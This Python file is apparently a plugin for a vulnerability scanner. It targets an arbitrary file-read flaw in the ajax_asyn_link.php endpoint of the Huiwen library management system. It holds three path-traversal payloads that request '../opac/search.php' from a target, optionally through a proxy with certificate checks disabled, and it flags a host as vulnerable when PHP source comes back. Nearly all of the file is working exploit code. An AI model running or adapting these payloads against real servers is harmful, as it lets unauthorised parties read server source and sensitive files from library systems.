#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 汇文软件图书管理系统ajax_asyn_link.php任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2010-067400
author: Lucifer
description: 漏洞影响3.5,4.0,5.0版本,漏洞文件位于ajax_asyn_link.php中,参数url可以传入"../"来读取PHP文件。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payloads=["/zplug/ajax_asyn_link.php?url=../opac/search.php",
          "/opac/zplug/ajax_asyn_link.php?url=../opac/search.php",
          "/hwweb/zplug/ajax_asyn_link.php?url=../opac/search.php"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    Medusas=[]
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        for payload in payloads:
            payload_url = scheme + "://" + url + payload
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if con.lower().find('<?php')!=-1:
                Medusa = "{} 存在汇文图书管理系统文件读取漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass